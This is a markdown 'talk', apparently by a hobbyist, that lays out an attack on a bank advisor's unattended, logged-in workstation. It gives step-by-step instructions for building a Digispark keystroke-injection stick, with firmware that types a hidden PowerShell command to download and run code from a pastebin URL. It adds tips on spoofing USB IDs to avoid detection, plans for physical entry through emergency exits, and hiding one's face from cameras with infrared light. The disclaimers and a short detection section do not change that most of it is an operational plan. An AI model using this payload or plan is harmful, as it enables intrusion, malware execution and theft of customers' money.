# Talk 1: Bank Security

## Description

This talk is about bank security, don't use it for illegal purpose ! I make this talk to help people to choose a secure bank and improve the bank security posture.

## Why

I visited my bank and met my financial advisor, when i did it i saw some cybersecurity problems, so i choose to talk about thoses problems.

## Talk

### Access to computer

1. I didn't pentest the web server, reverse the javascript in the web interface or reverse the mobile app, because it's a bank i suppose it's *secure*.
2. If i don't exploit a vulnerability on the server i should exploit a user vulnerability. I will not speak about fake bank application, phishing or social engineering to access to only one customer account.
3. The vulnerability is: my financial advisor ! Yes, my financial advisor does not comply with security policies and it's real problem ! He don't close the office door, don't lock the Windows session and keep the session to the bank application (with this application and this account we can performs bank transfer from customers bank account).
    - He leaves his office during interviews for several tens of seconds
    - He leaves his office between interviews for few minutes

### How to take the control of a computer with few seconds

 - Simply by plugging in a [rubber ducky](https://lab401.com/products/rubber-ducky) USB stick

> What is the rubber ducky USB stick ?
>> The Rubber Ducky USB stick is a type of USB device that is designed to emulate a keyboard and execute pre-programmed scripts when plugged into a computer. It looks like a regular USB flash drive, but its functionality is quite different.
>> When connected to a computer, the Rubber Ducky can send keystrokes at a very high speed, allowing it to perform tasks such as opening a command prompt, executing commands, or downloading malware without the user's knowledge. This makes it a popular tool for penetration testers and security researchers to demonstrate vulnerabilities in systems, as well as for malicious actors to exploit those vulnerabilities.
>> The device is often used in security training and awareness programs to illustrate the importance of physical security and the potential risks associated with USB devices.

#### How to build you own sneaky rubber ducky

 - Buy a [Digispark](https://www.amazon.fr/AZDelivery-Digispark-Kickstarter-d%C3%A9veloppement-compatible/dp/B01N7SGC1I/ref=sr_1_1_sspa?adgrpid=1364494866886671&dib=eyJ2IjoiMSJ9.a_zlnx8CDHiTiw5zWe84asWUApy6p6W48dBlv8WL41sYg6_Mzg4hhjx0PU_Y4SGOxyjB2a41tZSxNGzGm1G2SWxInTYzjo85b4P-cCSLxJu-fAd8X-VK8yI_0qyqdrEk4jvI_RNy9RW0I9tlibKRJoelIngWissoKjBtuo_tzbaPmcO2LY3Cnasl_s6NxZzXxAu6SlMygwqdZ6XG8YXrmf9k0ZxrKtqZp9U5LV6PEsnRX4ye6AA0TmveIwHy0_WjOKMv3fI1Lio-s4pW-psrw3LBO8VaHvEoyv9tjtgkQKs.00oPPHcg-eaUa4nHLYkowHAjejjkr0X5EoGj1OM31FQ&dib_tag=se&hvadid=85281187819663&hvbmt=be&hvdev=c&hvlocphy=126810&hvnetw=s&hvqmt=e&hvtargid=kwd-85281456177274%3Aloc-66&hydadcr=28259_1882664&keywords=digispark&msclkid=3a600951561e187ca1de6e227ee642d5&nsdOptOutParam=true&qid=1735600856&sr=8-1-spons&sp_csd=d2lkZ2V0TmFtZT1zcF9hdGY&psc=1).
 - Install the [Arduino IDE](https://www.arduino.cc/en/software).
 - Open the Arduino IDE, click on *File* -> *Preferences*, add `https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json` in the *Additional boards manager URLs:*, click *ok*.
 - Click on *Tools* -> *Board:* and click on *Boards manager...*, in the search bar write `Digistump` and click on the `Digistump AVR Boards by Digistump`.
 - Click on *Tools* -> *Programmer:* and select `Micronucleos` as bootloader (it's a very small and fast bootloader for Arduino compatible boards).

Now, you can put your code:

```c
#include <DigiKeyboard.h>

// https://github.com/digistump/DigistumpArduino/blob/111396ffe5163c3613b9315cbea1a3eabc9ba6dc/digistump-avr/libraries/DigisparkKeyboard/DigiKeyboard.h#L66

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(21, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);

  DigiKeyboard.print("powershell -windowstyle hidden -Command ");
  DigiKeyboard.sendKeyStroke(79);
  DigiKeyboard.print("iex(iwr -Uri 'https://pastebin.com/raw/bcjhnYKG').Content");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

 - Click on the *Upload* button (a *right arrow* button)
 - The Arduino IDE will compile the code
 - When the code is compiled, it will wait 60 seconds a new plugged Digispark, so you may plug your Digispark on a USB port
 - The Arduino IDE will flash the firmware
 - The Digispark will play the code

Okay, so we have the Rubber Ducky, but we have some limitations: 512 bytes of RAM and we have a good payload for *qwerty* keyboard but not for others keyboards. For qwerty keyboard and azerty keyboard i have developed a little [python script](https://github.com/mauricelambert/DigisparkRubberDuckyExecuteCommand) to generate your own code to execute a command on the victim computer without the RAM limitation.

 - When a new keyboard is plugged, the vendor and the device ID are stored on the Windows computer, if you want to be undetectable you should modify the `%LOCALAPPDATA%\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\DigisparkKeyboard\usbconfig.h` file, line 232 to change the vendor ID: `USB_CFG_VENDOR_ID` ([web page](https://devicehunt.com/all-usb-vendors) to identify a vendor ID) and line 241 change the device ID: `USB_CFG_DEVICE_ID` ([web page](https://www.usbvendor.com/) to identify a device ID).

You can list your Vendor ID and your Product ID with the following powershell code:

```powershell
Get-WmiObject Win32_PnPEntity | Where-Object {$_.PNPClass -match "Mouse|Keyboard"} | ForEach-Object {
    $hwid = $_.HardwareID | Where-Object {$_ -match "(HID|USB)\\VID_.*"}
    if ($hwid) {
        $v_id = ($hwid -split '&')[0] -replace '(HID|USB)\\VID_',''
        $p_id = ($hwid -split '&')[1] -replace 'PID_',''
        [PSCustomObject]@{
            Name = $_.Name
            VendorID = $v_id
            ProductID = $p_id
        }
    }
}

Get-ChildItem -Path HKLM:\System\CurrentControlSet\Enum\USB\ | ForEach-Object {
    $v_id = ((($_ -split '&')[0] -replace '(HID|USB)\\VID_','') -split '\\')[-1]
    $p_id = ($_ -split '&')[1] -replace 'PID_',''
    [PSCustomObject]@{
        VendorID = $v_id
        ProductID = $p_id
    }
}
```

#### What about detection and protection

In this case the better tools to mitigate the vulnerability is the EDR:
 - EDR should detect the new device (even if the device ID is already now because the driver is different), should detect the `Win+R`, should detect writing at 40 characters per second, should detect the `powershell` process creation, should detect the *hidden windows*, should detect the code downloaded from internet and executed **BUT** i try one of the best-selling EDR and there is no detection and no protection, only a telemetry for the process and nothing else... This EDR must have really, really good sales teams...
 - SIEM can detect a new device (and probably not if the device ID is already know), so you don't have detection and don't have response (with SOAR or other tools to block the attack).

### Access to the office

The bank have 3 cameras on the same corridor, all people **should** use this corridor, but other ways to enter exists...

 - multiples windows (not very easy to use for a sneaky intrusion)
 - 2 emergency exits
     1. *Backdoor* the door during a legit visit
     2. Open the door from the outside with *some specific techniques*

### When

Take few days to know the financial advisor habits, you should identify good time for the intrusion.

### Others ways

 - Secretary have leaked the name of other customer, with this name you can use it to take a new appointment, use infrared light to hide your head on camera and exploit the vulnerability when financial advisor leave the office for few seconds during the interview.
 - When the financial advisor's screens are visible from the outside, it is possible to retrieve sensitives informations to performs the same attack.

## Conclusion

We have a vulnerability: the unlocked and unattended financial advisor computer with the authenticated financial advisor session. We have an access from the outdoor and we know the best time to do it... So, it's possible to pwn the bank...

Since few day, i have changed my bank, i think people should choice a secure bank and i hope this talk will help you to know which bank is secure.

> Don't use this talk for illegal purpose ! It's probably easy, in your dreams, to perform the attack described in this talk but in the real life is not and if you try you will go to jail. Keep in mind: if you have skills to perform this attack you will have a very good salary in a completely legal way so you won't even think of this idea.
